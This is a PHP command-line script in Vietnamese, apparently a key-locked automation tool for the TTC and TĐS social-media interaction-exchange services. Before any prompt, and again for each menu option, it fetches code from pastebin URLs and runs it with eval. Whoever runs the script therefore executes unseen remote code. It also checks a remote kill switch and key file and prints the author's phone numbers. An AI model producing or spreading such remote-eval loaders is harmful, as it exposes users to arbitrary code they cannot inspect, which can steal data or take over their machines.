<?php
error_reporting(0);
session_start();
eval(file_get_contents("https://pastebin.com/raw/jc2m5xP3"));
//color
date_default_timezone_set("Asia/Ho_Chi_Minh");

$ress = "\033[0;32m";
$res = "\033[0;33m";
$red = "\033[0;31m";
$green = "\033[0;37m";
$nau= "\e[38;5;94m";
$white = "\033[0;33m";
$banner = "\r";
$xnhac = "\033[1;96m";
$den = "\033[1;90m";
$do = "\033[1;91m";
$luc = "\033[1;92m";
$vang = "\033[1;93m";
$xduong = "\033[1;94m";
$hong = "\033[1;95m";
$trang = "\033[1;97m";
$y2="\033[0;33m";
$white= "\033[0;37m";
$cyan= "\e[1;36m";
$blue="\e[1;34m";
$ngreen="\033[42m";
$ngreen="\033[42m";
$maul=rand(31,37);
$maui="\033[1;".$maul."m";
$input = array($d2="\033[1;36m",$tmd3="\033[1;37m",$tmd4="\033[1;37m",$tmd5="\033[0;31m",$tmd6="\033[1;31m",$tmd7="\033[0;32m",$tmd8="\033[1;32m",$tmd9="\033[0;33m",$tmd10="\033[1;33m",$tmd11="\033[0;34m",$tmd12="\033[1;34m",$tmd13="\033[0;35m",$tmd14="\033[1;35m",$tmd15="\033[0;36m",$tmd16="\033[1;36m");
$rand_keys = array_rand($input, 10);
$input = array($tmd1="\033[1;46m",$tmd2="\033[1;36m",$tmd3="\033[1;37m",$tmd4="\033[1;37m",$tmd5="\033[0;31m",$tmd6="\033[1;31m",$tmd7="\033[0;32m",$tmd8="\033[1;32m",$tmd9="\033[0;33m",$tmd10="\033[1;33m",$tmd11="\033[0;34m",$tmd12="\033[1;34m",$tmd13="\033[0;35m",$tmd14="\033[1;35m",$tmd15="\033[0;36m",$tmd16="\033[1;36m");
$rand_keys = array_rand($input, 15);
$banner="\r
echo $yellow.===============================================================\n";
$checkkey  = file('https://haitricker2110.000webhostapp.com/key');
$lock=file_get_contents('https://haitricker2110.000webhostapp.com/lock');
$keylock=md5(htmlspecialchars($lock));
echo $res;
if (md5('lock') != $keylock) {
	sleep(0);
	echo $red."\033[1;35m[\033[1;33mWARING\033[1;35m]\n".$red;
	echo $red."         🌸\033[1;31mSEVER TẠM NGỪNG HOẠT ĐỘNG🌸\n".$red;
	echo $syan."\033[1;34m[\033[1;36mZalo\033[1;34m]⇒ \033[1;32m0365.116.991\n".$red;
	echo $syan."\033[1;34m[\033[1;36mFacebook\033[1;34m]⇒ \033[1;33mNguyễn Hoàng Hải\n".$red;
exit($red."Vui Lòng Liên Hệ \033[1;35m Hải \033]1;31mĐể Lấy Tool Mới Nhé !!\n".$red);
@system('clear');
}
sleep(1); 
while (true) {
 echo "\033[0;37m==============================================================\n";
 echo "\033[1;97m ~\033[1;91m[\033[1;92mNhập Key Hải Cho Đi :)) :\033[1;91m] \033[1;97m=> \033[1;93m";
      $makey = trim(fgets(STDIN));
    if ($makey == $checkkey[0]) 
   
    {
    sleep(2);
        echo "\033[1;32";
        echo "\n";
        break;
    } else {
        echo "\033[1;31mKey Sai Vui Lòng Liên Hệ \033[1;34mZalo : 03653151××\033[1;31mĐể Lấy Key Mới";
        echo "\n";
       }
       }
//Nhap Tai Khoan
system('clear');
echo $banner;
@system('clear');
 echo $vang."             CHÀO MỪNG CÁC BẠN ĐÃ ĐẾN VỚI TOOL MÌNH \n";
  echo $trang." =============================================================== \n";
echo $cyan."  [".$luc."🌸".$do."] ".$blue."☞ YouTube: Hoàng Hải Ofcical\n";
echo $white."  [".$luc."🌸".$do."] ".$white."☞ Zalo: 0365315163\n";
echo $hong."  [".$luc."🌸".$do."] ".$hong."☞ Tsr: princess\n";
echo $luc."  [".$luc."🌸".$do."] ".$luc."☞ Facebook: Nguyễn Hoàng Hải\n";
echo $do."  [".$luc."🌸".$do."] ".$do."☞ Nhớ Đăng Kí Kênh Nha\n";
  echo $trang." =============================================================== \n";
echo $luc."   ✅ Nhập 1 Chế Độ TTC Đa luồng:\n";
echo $luc."   ✅ Nhập 2 Chế Độ TĐS Đa luồng:\n";
echo $luc."   ✅  Nhập 3 Chế Độ ... :\n"; 
echo $do."--------------------------------\n";
echo $vang."==> Vui Lòng Chọn Chế Độ :";
$chedo=trim(fgets(STDIN));
if($chedo== '1'){
if(!$sock = @fsockopen('www.google.com',80))
{
echo "Vui Lòng Bật Kết Nối Mạng";
exit();
}
eval(file_get_contents('https://pastebin.com/raw/FSwSu3Cq'));
}else if($chedo == '2'){
eval(file_get_contents('https://pastebin.com/raw/kufJtJJF'));
}else if($chedo == '3'){
eval(file_get_contents('https://pastebin.com/raw/3AH41UA4'));
}


       
